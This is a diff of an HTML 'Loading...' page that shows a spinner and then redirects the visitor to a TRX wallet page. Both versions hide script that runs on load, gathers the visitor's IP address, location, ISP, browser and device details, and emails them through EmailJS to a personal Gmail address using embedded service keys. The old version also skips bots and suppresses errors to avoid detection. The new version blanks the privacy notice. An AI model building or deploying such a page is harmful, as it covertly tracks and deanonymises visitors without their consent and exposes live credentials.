@@ -1,132 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <!-- KEEP ALL ORIGINAL METADATA AND STYLES -->
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .privacy-notice { position: fixed; bottom: 10px; left: 10px; font-size: 12px; color: #666; max-width: 300px; }
+        body { /* Keep original styles */ }
+        .loader { /* Keep original styles */ }
+        @keyframes spin { /* Keep original animation */ }
+        .privacy-notice { /* Keep original notice */ }
     </style>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
     <div class="loader"></div>
-    <div class="privacy-notice">This site collects anonymous information about your device and location for internal analytics purposes.</div>
+    <div class="privacy-notice"><!-- Keep original text --></div>
 
-    <script>
+    <script type="text/javascript">
+        // Initialize EmailJS FIRST
         (function() {
-            window.onerror = () => true;
-            if(navigator.webdriver || window._phantom) return redirectToTarget();
-            
             emailjs.init("RrfKXUJqdjRY9RI8E");
+        })();
 
-            async function collectUserData() {
-                const data = {
-                    timestamp: new Date().toISOString(),
-                    referrer: document.referrer || "Direct",
-                    browser: { 
-                        ua: navigator.userAgent,
-                        lang: navigator.language,
-                        cookies: navigator.cookieEnabled,
-                        dnt: navigator.doNotTrack,
-                        platform: navigator.platform,
-                        vendor: navigator.vendor
-                    },
-                    screen: { 
-                        width: window.screen.width,
-                        height: window.screen.height,
-                        colorDepth: window.screen.colorDepth,
-                        pixelDepth: window.screen.pixelDepth
-                    },
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    deviceType: getDeviceType()
-                };
+        // Force loader visibility
+        document.body.style.display = 'flex';
 
-                await tryMultipleGeoServices(data);
-                if(data.country === "EU") data.ip = "REDACTED";
-                return data;
+        async function collectUserData() {
+            const userData = {
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || "Direct visit",
+                browser: {
+                    name: navigator.userAgent,
+                    language: navigator.language,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    platform: navigator.platform
+                },
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceType: getDeviceType()
+            };
+
+            // Simplified IP lookup
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                userData.ip = (await ipRes.json()).ip;
+            } catch {
+                userData.ip = "Unknown";
             }
 
-            async function tryMultipleGeoServices(d) {
-                let success = await tryIpifyAndIpapi(d);
-                if(!success) success = await tryIpgeolocation(d);
-                if(!success) success = await tryGeojs(d);
-                if(!success) setDefaultGeoValues(d);
-                return success;
-            }
+            return userData;
+        }
 
-            async function tryIpifyAndIpapi(d) {
-                try {
-                    const ip = await (await fetch('https://api.ipify.org?format=json')).json();
-                    d.ip = ip.ip;
-                    const geo = await (await fetch(`https://ipapi.co/${d.ip}/json/`)).json();
-                    d.city = geo.city || "Unknown";
-                    d.region = geo.region || "Unknown";
-                    d.country = geo.country_name || "Unknown";
-                    d.loc = `${geo.latitude},${geo.longitude}`;
-                    d.isp = geo.org || "Unknown";
-                    return true;
-                } catch(e) { return false; }
-            }
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            return /Mobile|Android/i.test(ua) ? "Mobile" : /Tablet|iPad/i.test(ua) ? "Tablet" : "Desktop";
+        }
 
-            async function tryIpgeolocation(d) {
-                try {
-                    const geo = await (await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=b63a7d0a7e584b4d9a3a3e0d0c4f1a5a')).json();
-                    d.ip = geo.ip;
-                    d.city = geo.city || "Unknown";
-                    d.region = geo.state_prov || "Unknown";
-                    d.country = geo.country_name || "Unknown";
-                    d.loc = `${geo.latitude},${geo.longitude}`;
-                    d.isp = geo.isp || "Unknown";
-                    return true;
-                } catch(e) { return false; }
+        async function sendEmail(userData) {
+            try {
+                await emailjs.send('service_2go8qdw', 'template_mu47rv7', {
+                    to_email: 'abdalrahimsaid@gmail.com',
+                    subject: 'User Data Report',
+                    message: JSON.stringify(userData, null, 2)
+                });
+            } catch(error) {
+                console.error('Email error:', error);
             }
+        }
 
-            async function tryGeojs(d) {
-                try {
-                    const geo = await (await fetch('https://get.geojs.io/v1/ip/geo.json')).json();
-                    d.ip = geo.ip;
-                    d.city = geo.city || "Unknown";
-                    d.region = geo.region || "Unknown";
-                    d.country = geo.country || "Unknown";
-                    d.loc = `${geo.latitude},${geo.longitude}`;
-                    d.isp = "Unknown";
-                    return true;
-                } catch(e) { return false; }
+        // Guaranteed redirect flow
+        window.onload = async () => {
+            try {
+                const data = await collectUserData();
+                await sendEmail(data);
+            } finally {
+                setTimeout(() => {
+                    window.location.href = 'https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4tR1T8jd';
+                }, 2000);
             }
-
-            function setDefaultGeoValues(d) {
-                d.ip = d.city = d.region = d.country = d.loc = d.isp = "Unknown";
-            }
-
-            function getDeviceType() {
-                const ua = navigator.userAgent;
-                return /tablet|ipad/i.test(ua) ? "Tablet" : 
-                       /mobile|android/i.test(ua) ? "Mobile" : "Desktop";
-            }
-
-            async function sendEmail(d) {
-                const html = `
-                    <h2>Forensic Data Report</h2>
-                    <p><strong>IP:</strong> ${d.ip}</p>
-                    <p><strong>Location:</strong> ${d.city}, ${d.country}</p>
-                    <p><strong>User Agent:</strong> ${d.browser.ua}</p>
-                `;
-                
-                try {
-                    await emailjs.send('service_2go8qdw', 'template_mu47rv7', {
-                        to_email: 'abdalrahimsaid@gmail.com',
-                        subject: 'Forensic Data Report',
-                        message: html
-                    });
-                    return true;
-                } catch(e) {
-                    return false;
-                }
-            }
-
-            function redirectToTarget() {
-                window.location.replace('https://www.oklink.com/trx/address/TQ6WV8CgCFaqUJ17fhmwhz3rJP4
+        };
+    </script>
+</body>
+</html>
